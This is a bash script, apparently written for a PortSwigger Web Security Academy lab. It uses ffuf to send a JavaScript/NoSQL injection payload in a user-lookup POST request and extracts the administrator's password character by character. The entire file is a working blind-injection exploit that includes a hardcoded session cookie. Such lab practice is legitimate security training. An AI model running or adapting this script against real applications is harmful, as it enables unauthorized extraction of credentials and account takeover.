#!/bin/bash

password=""
for pos in 0 1 2 3 4 5 6 7; do
  result=$(ffuf -u "https://0a29003903789b08834d2315000b0044.web-security-academy.net/user/lookup" \
    -X POST \
    -H "Cookie: session=HDOmrDVGS8zyr9S7ebW4S0vBKGqCsxLB" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "user=administrator'+%26%26+this.password[$pos]=='FUZZ'+||+'a'%3d%3d'b" \
    -w /Users/omrinuri/projects/portswigger/chars.txt \
    -mr "administrator" 2>/dev/null | grep -E "^[a-z0-9]" | head -1)

  password="${password}${result}"
  echo "Position $pos: $result (Password so far: $password)"
done

echo "Full administrator password: $password"